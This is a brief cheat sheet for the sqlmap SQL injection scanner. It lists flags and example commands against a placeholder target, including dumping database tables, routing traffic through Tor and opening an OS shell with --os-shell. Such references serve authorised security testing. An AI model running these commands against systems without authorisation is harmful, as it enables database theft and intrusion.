# sqlmap

**Platforms:** Multi-platform  
**Category:** SQL Injection Scanner

## Quick Reference

| Goal | Command |
|------|---------|
| Basic test | `sqlmap -u 'http://target/page.php?id=1'` |
| Batch mode | `sqlmap -u '...' --batch` |
| Output | `sqlmap -u '...' --output-dir=/tmp/sqlmap` |

## Command-Line Flags

```bash
sqlmap -u 'http://target/page.php?id=1'
sqlmap -u 'http://target/page.php?id=1' --batch  # Auto-answer
sqlmap -u 'http://target/page.php?id=1' --level=3 --risk=2
sqlmap -u 'http://target/page.php?id=1' --dbs    # List databases
sqlmap -u 'http://target/page.php?id=1' --tables -D dbname
sqlmap -u 'http://target/page.php?id=1' --dump -D dbname -T table
sqlmap -u 'http://target/page.php?id=1' --os-shell
sqlmap -r request.txt                  # From request file
sqlmap --cookie='session=xxx' -u 'http://target/'
sqlmap -u 'http://target/' --data='user=1&pass=2'
sqlmap -u 'http://target/' --tor      # Use Tor
sqlmap -u 'http://target/' --output-dir=/tmp/sqlmap
sqlmap -u 'http://target/' --flush-session
```
- `-u` or `--url`: Target URL
- `--batch`: Auto-answer prompts
- `--level`: Test level (1-5)
- `--risk`: Risk level (1-3)
- `--dbs`: Enumerate databases
- `--tables`: Enumerate tables
- `--dump`: Dump table data
- `-r`: Request from file
- `--cookie`: Cookie header
- `--data`: POST data
- `--tor`: Use Tor network
- `--output-dir`: Output directory
- `--flush-session`: Flush session data
